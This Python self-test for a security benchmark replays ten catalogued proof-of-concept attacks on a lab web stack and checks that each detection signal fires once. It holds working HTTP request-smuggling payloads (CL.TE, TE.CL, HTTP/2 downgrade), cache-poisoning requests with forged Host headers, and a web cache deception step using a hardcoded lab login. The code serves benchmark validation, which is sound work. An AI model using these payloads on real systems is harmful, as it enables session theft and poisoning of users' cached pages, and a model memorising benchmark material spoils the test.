#!/usr/bin/env python3
"""Replay every catalog PoC for the edge target and assert each signal fires exactly once.

This is what stops the corpus from being decorative. An entry that claims a framing
desynchronisation but whose PoC no longer desynchronises anything is worse than no
entry at all: every tool silently loses a point it could never have won, and "nobody
found it" is indistinguishable from "it is hard".

Method
------
Every request is written to a raw socket, byte for byte. An HTTP client library would
normalise the exact headers under test, and the HTTP/2 case is spoken by hand for the
same reason.

Identification of this traffic as the platform's own is by SOURCE ADDRESS, not by any
marker header: run this from the internal network, whose range the origin has in
TELEMETRY_SYNTHETIC_CIDRS. A marker header would be visible to a tool through any
reflection or header-injection flaw in the target and would hand it the shape of the
grader. There is nothing in the bytes below that identifies the sender.

The target must be freshly reset before this runs and is left reset after it:

    docker compose exec edge-origin /usr/local/bin/state-reset
    ... run this ...
    docker compose exec edge-origin /usr/local/bin/state-reset

Usage
-----
    python3 targets/edge/selftest.py                # replay + assertions
    python3 targets/edge/selftest.py --no-collector # replay only

Run it from the internal network, e.g.

    docker run --rm --network bench-internal -v "$PWD:/w" -w /w python:3.12-alpine \\
        python targets/edge/selftest.py

Environment
-----------
    EDGE_HOST            default nginx                    front tier
    EDGE_PORT            default 80                       TCP relay -> balancer -> origin
    EDGE_H2_PORT         default 8081                     h2c entry -> origin
    EDGE_SITE_DOMAIN     default halyardsupply.net
    TELEMETRY_ENDPOINT   default http://otel-collector:8900
    EDGE_SETTLE_SECONDS  default 6                        wait for the coherence probe
"""

from __future__ import annotations

import json
import os
import re
import socket
import sys
import time
import urllib.error
import urllib.request
from pathlib import Path

HOST = os.environ.get("EDGE_HOST", "nginx")
PORT = int(os.environ.get("EDGE_PORT", "80"))
H2_PORT = int(os.environ.get("EDGE_H2_PORT", "8081"))
DOMAIN = os.environ.get("EDGE_SITE_DOMAIN", "halyardsupply.net")
VHOST = os.environ.get("EDGE_CANONICAL_HOST", "www." + DOMAIN)
ENDPOINT = os.environ.get("TELEMETRY_ENDPOINT", "http://otel-collector:8900").rstrip("/")
SETTLE = float(os.environ.get("EDGE_SETTLE_SECONDS", "6"))

ACCOUNT = f"n.okonkwo@{DOMAIN}"
ACCOUNT_PASSWORD = "harbour-mist-4417"

RUN_TAG = format(int(time.time()) % 100000, "05d")
CATALOG = Path(__file__).resolve().parents[2] / "catalog" / "vulns"


# ---------------------------------------------------------------------------
# catalog: id <-> signal
# ---------------------------------------------------------------------------

def load_signals() -> dict[str, str]:
    """Map catalog id -> oracle.signal, without requiring a YAML parser.

    The self-test asserts on signals because that is all a compliant target emits;
    the catalog is the only place the mapping back to an id exists.
    """
    out: dict[str, str] = {}
    for path in sorted(CATALOG.glob("BENCH-EDGE-*.yaml")):
        text = path.read_text()
        vid = re.search(r"^id:\s*(\S+)", text, re.M)
        sig = re.search(r"^\s*signal:\s*(\S+)", text, re.M)
        if vid and sig:
            out[vid.group(1)] = sig.group(1).strip("\"'")
    return out


# ---------------------------------------------------------------------------
# raw HTTP/1.1
# ---------------------------------------------------------------------------

def raw(payload: bytes, *, port: int = PORT, read_for: float = 2.0) -> bytes:
    """Write payload verbatim on a fresh connection and read whatever comes back.

    Responses are not asserted on. Once a chain is desynchronised its responses are by
    definition mismatched to the requests, and which one comes back down this socket
    is not the question. The ground truth is what the origin recorded.
    """
    s = socket.create_connection((HOST, port), timeout=5)
    try:
        s.sendall(payload)
        s.settimeout(read_for)
        chunks, deadline = [], time.time() + read_for
        while time.time() < deadline:
            try:
                b = s.recv(65536)
            except socket.timeout:
                break
            if not b:
                break
            chunks.append(b)
        return b"".join(chunks)
    finally:
        s.close()


def req1(method: str, target: str, extra=(), body: bytes = b"", host: str | None = None) -> bytes:
    head = f"{method} {target} HTTP/1.1\r\nHost: {host or VHOST}\r\n".encode()
    for h in extra:
        head += h if h.endswith(b"\r\n") else h + b"\r\n"
    if body:
        head += b"Content-Length: %d\r\n" % len(body)
    head += b"\r\n"
    return head + body


def stray_request() -> bytes:
    """The request that has to arrive at the origin without anyone having sent it.

    It is complete, blank line included, so the origin can parse it without waiting
    for a following request to finish it off: the point being proven is the moved
    message boundary, not the impact on a victim.
    """
    return (
        f"GET /api/v1/ping HTTP/1.1\r\n"
        f"Host: {VHOST}\r\n"
        f"Accept: application/json\r\n"
        f"\r\n"
    ).encode()


# ---------------------------------------------------------------------------
# framing PoCs
# ---------------------------------------------------------------------------

def _cl_te(target: str, coding_header: bytes) -> None:
    """Front hop frames by Content-Length, origin frames by chunked.

    The front forwards every declared byte; the origin stops at the zero chunk and the
    remainder starts what it reads as the next request.
    """
    body = b"0\r\n\r\n" + stray_request()
    head = (
        f"POST {target} HTTP/1.1\r\nHost: {VHOST}\r\n".encode()
        + b"Content-Type: application/x-www-form-urlencoded\r\n"
        + b"Content-Length: %d\r\n" % len(body)
        + coding_header
        + b"\r\n"
    )
    raw(head + body)


def poc_0001() -> None:
    """CL.TE, coding header spelled with an underscore."""
    _cl_te("/submit", b"Transfer_Encoding: chunked\r\n")


def poc_0004() -> None:
    """CL.TE, coding value prefixed with a vertical tab (0x0b).

    The coding header's name carries a space before the colon. The balancer reads the
    name as "Transfer-Encoding " and so does not recognise a coding header at all, which
    is what leaves it framing by Content-Length; the origin's reader trims the name and
    then has to strip the vertical tab off the value before it matches "chunked", which
    is the observation the counter attributes on. Sending the same value under the plain
    name is answered 400 by the balancer, which rejects any coding it does not know
    before the message can reach anything.
    """
    _cl_te("/api/cart/items", b"Transfer-Encoding : \x0bchunked\r\n")


def _te_cl(method: str, target: str, coding_headers: bytes) -> None:
    """Front hop frames by chunked, origin frames by Content-Length.

    Content-Length is exactly the length of the chunk-size line, so the origin consumes
    "<hex>CRLF" and nothing more; the chunk data — a complete request — is what it reads
    next, while the front is still forwarding what it considers one body.

    The length header is spelled with an underscore. Once the balancer has decided a
    message is chunked it deletes every header literally named Content-Length before
    forwarding, which would leave the origin with no framing at all and a request line
    it cannot parse — the boundary would still have moved, but the connection would drop
    instead of a request emerging from the gap. The underscore spelling is opaque to the
    balancer and is folded back to "-" by the origin's reader, so the length survives the
    hop that framed by chunked. Same disagreement, same two tests, one spelling.
    """
    stray = stray_request()
    size_line = b"%x\r\n" % len(stray)
    body = size_line + stray + b"\r\n0\r\n\r\n"
    head = (
        f"{method} {target} HTTP/1.1\r\nHost: {VHOST}\r\n".encode()
        + b"Content-Type: application/x-www-form-urlencoded\r\n"
        + b"Content_Length: %d\r\n" % len(size_line)
        + coding_headers
        + b"\r\n"
    )
    raw(head + body)


def poc_0002() -> None:
    """TE.CL, two coding headers; the origin honours the last.

    The second name carries a space before the colon: the balancer reads it as a
    different header, keeps framing on the first (chunked) one and forwards both, while
    the origin trims the name and honours "cow" as the last coding. Spelling the second
    one plainly is answered 400 — the balancer rejects a message carrying two coding
    headers outright.
    """
    _te_cl("POST", "/account/preferences",
           b"Transfer-Encoding: chunked\r\nTransfer-Encoding : cow\r\n")


def poc_0005() -> None:
    """TE.CL, a coding list that is valid chunked but not literally "chunked"."""
    _te_cl("PUT", "/api/cart/items/7", b"Transfer-Encoding: identity, chunked\r\n")


# ---- HTTP/2 (h2c), hand-rolled ---------------------------------------------

H2_PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"


def h2_frame(ftype: int, flags: int, stream: int, payload: bytes) -> bytes:
    return len(payload).to_bytes(3, "big") + bytes([ftype, flags]) + stream.to_bytes(4, "big") + payload


def hpack_literal(name: str, value: str) -> bytes:
    """Literal header field without indexing, new name, no Huffman (RFC 7541 6.2.2).

    Hand-rolled so this has no third-party dependency and so nothing normalises the
    header set on the way out.
    """
    n, v = name.encode(), value.encode()
    assert len(n) < 127 and len(v) < 127
    return b"\x00" + bytes([len(n)]) + n + bytes([len(v)]) + v


def poc_0003() -> None:
    """An HTTP/2 request whose declared content-length disagrees with its DATA.

    HTTP/2 has no length framing — a message ends with END_STREAM — so the mismatch is
    inert until the front tier converts the request down to HTTP/1.1 using the declared
    length while forwarding the payload it actually received.
    """
    stray = stray_request()
    headers = (
        hpack_literal(":method", "POST")
        + hpack_literal(":path", "/api/reviews")
        + hpack_literal(":scheme", "http")
        + hpack_literal(":authority", VHOST)
        + hpack_literal("content-type", "application/json")
        + hpack_literal("content-length", "0")
    )
    payload = (
        H2_PREFACE
        + h2_frame(0x4, 0x0, 0, b"")       # SETTINGS
        + h2_frame(0x4, 0x1, 0, b"")       # SETTINGS ACK
        + h2_frame(0x1, 0x4, 1, headers)   # HEADERS, END_HEADERS
        + h2_frame(0x0, 0x1, 1, stray)     # DATA, END_STREAM
    )
    raw(payload, port=H2_PORT, read_for=3.0)


# ---- cache and absolute-URL PoCs -------------------------------------------

def poc_0006() -> None:
    """A host taken from a header reaches a cacheable body that is not keyed on it.

    The cache-buster keeps the object key unique per run so the first request is
    guaranteed to reach the origin instead of being answered from a warm entry.
    """
    evil = f"offers-{RUN_TAG}.partner-cdn.test"
    raw(req1("GET", f"/promo?cb={RUN_TAG}", [f"X-Forwarded-Host: {evil}".encode()]))


def poc_0007() -> None:
    """A query parameter the cache normalises out of the key reaches a cacheable body.

    `lang` goes last: the probe's clean URL is this one minus `lang`, and both have to
    normalise to the same key.
    """
    raw(req1("GET", f"/news?cb={RUN_TAG}&lang=xx-{RUN_TAG}"))


def poc_0008() -> None:
    """A personalised page stored under an asset-looking key.

    Sign in first so there is something personalised to store, then request the same
    page with a .css suffix, which the cache keeps as a public object.
    """
    body = f"email={ACCOUNT}&password={ACCOUNT_PASSWORD}".encode()
    resp = raw(req1("POST", "/account/login",
                    [b"Content-Type: application/x-www-form-urlencoded"], body))
    m = re.search(rb"Set-Cookie:\s*(sid=[^;\r\n]+)", resp, re.I)
    if not m:
        print("  ! sign-in did not return a session; this PoC cannot fire", file=sys.stderr)
        return
    raw(req1("GET", f"/account/profile.css?cb={RUN_TAG}", [b"Cookie: " + m.group(1)]))


def poc_0009() -> None:
    """An absolute link built from the request's Host, on a response the cache keeps
    under a key that does not include the Host."""
    evil = f"reset-{RUN_TAG}.partner-cdn.test"
    raw(req1("GET", f"/account/reset?cb={RUN_TAG}", host=evil))


def poc_0010() -> None:
    """The same, landing in a cached redirect's Location and sourced from
    X-Forwarded-Host."""
    evil = f"go-{RUN_TAG}.partner-cdn.test"
    raw(req1("GET", f"/go?to=/promo&cb={RUN_TAG}", [f"X-Forwarded-Host: {evil}".encode()]))


POCS = [
    ("BENCH-EDGE-0001", poc_0001),
    ("BENCH-EDGE-0002", poc_0002),
    ("BENCH-EDGE-0003", poc_0003),
    ("BENCH-EDGE-0004", poc_0004),
    ("BENCH-EDGE-0005", poc_0005),
    ("BENCH-EDGE-0006", poc_0006),
    ("BENCH-EDGE-0007", poc_0007),
    ("BENCH-EDGE-0008", poc_0008),
    ("BENCH-EDGE-0009", poc_0009),
    ("BENCH-EDGE-0010", poc_0010),
]


# ---------------------------------------------------------------------------
# platform API
# ---------------------------------------------------------------------------

def api(method: str, path: str, body: dict | None = None):
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(ENDPOINT + path, data=data, method=method,
                                 headers={"Content-Type": "application/json"})
    with urllib.request.urlopen(req, timeout=10) as r:
        payload = r.read()
    return json.loads(payload) if payload else None


def main() -> int:
    signals = load_signals()
    missing = [v for v, _ in POCS if v not in signals]
    if missing:
        print(f"catalog entries without a signal: {', '.join(missing)}", file=sys.stderr)
        return 2
    by_signal = {sig: vid for vid, sig in signals.items()}

    use_api = "--no-collector" not in sys.argv
    run_id = None
    if use_api:
        try:
            run = api("POST", "/v1/runs", {
                "tool": "selftest",
                "profile": "edge-poc-replay",
                "targets": ["edge"],
                "notes": "targets/edge/selftest.py",
                "force": True,
            })
            run_id = run["run_id"]
            print(f"run {run_id}")
        except (urllib.error.URLError, OSError) as e:
            print(f"cannot reach the platform API at {ENDPOINT}: {e}", file=sys.stderr)
            print("re-run with --no-collector to replay without assertions", file=sys.stderr)
            return 2

    for vuln_id, fn in POCS:
        print(f"  replaying {vuln_id} ... ", end="", flush=True)
        try:
            fn()
            print("sent")
        except OSError as e:
            print(f"FAILED to send: {e}")

    if not use_api:
        print("replay done (no assertions)")
        return 0

    # The cache counters are confirmed asynchronously by the origin's coherence probe,
    # so the run cannot be closed until it has had its say.
    print(f"waiting {SETTLE}s for the cache coherence probe ...")
    time.sleep(SETTLE)

    api("POST", f"/v1/runs/{run_id}/close")
    page = api("GET", f"/v1/runs/{run_id}/events?type=signal&limit=50000")
    events = page.get("events", []) if isinstance(page, dict) else []

    counts: dict[str, int] = {}
    details: dict[str, str] = {}
    peerless: dict[str, int] = {}
    for ev in events:
        rec = ev.get("payload", ev) if isinstance(ev.get("payload"), dict) else ev
        sig = rec.get("signal")
        if not sig:
            continue
        counts[sig] = counts.get(sig, 0) + 1
        # A sink that hands its work to a raw thread pool loses the request context, and
        # its record then arrives with no peer at all — indistinguishable from a genuine
        # background job, so nothing downstream can tell this replay apart from a tool's
        # own exploitation. Assert it here rather than discover it in a scored run.
        if not (rec.get("peer_ip") or rec.get("source_ip")) or rec.get("peer_missing"):
            peerless[sig] = peerless.get(sig, 0) + 1
        attrs = rec.get("attributes") or rec.get("evidence") or {}
        if attrs.get("detail") and sig not in details:
            details[sig] = attrs["detail"]

    print()
    failures = []
    for vuln_id, _ in POCS:
        sig = signals[vuln_id]
        n = counts.get(sig, 0)
        no_peer = peerless.get(sig, 0)
        ok = n == 1 and no_peer == 0
        suffix = "" if not no_peer else f"  no-peer={no_peer}"
        print(f"{'ok  ' if ok else 'FAIL'} {vuln_id}  {sig}  count={n}{suffix}")
        if sig in details:
            print(f"       {details[sig][:300]}")
        if not ok:
            failures.append(vuln_id)

    for sig in sorted(set(counts) - set(by_signal)):
        print(f"FAIL unexpected signal {sig} ({counts[sig]}) — another target's counter?")
        failures.append(sig)

    print()
    if failures:
        print(f"{len(failures)} of {len(POCS)} entries did not fire exactly once with a peer")
        print("count 0: the chain repaired the behaviour (check the pinned versions), or "
              "the PoC no longer matches what the origin's reader does.")
        print("count >1: something is counting the payload rather than the effect, which "
              "would hand tools free points.")
        print("no-peer: the record arrived with no socket peer, so nothing downstream can "
              "tell this replay from a tool's own exploitation.")
        return 1

    print(f"all {len(POCS)} edge counters fired exactly once")
    return 0


if __name__ == "__main__":
    sys.exit(main())
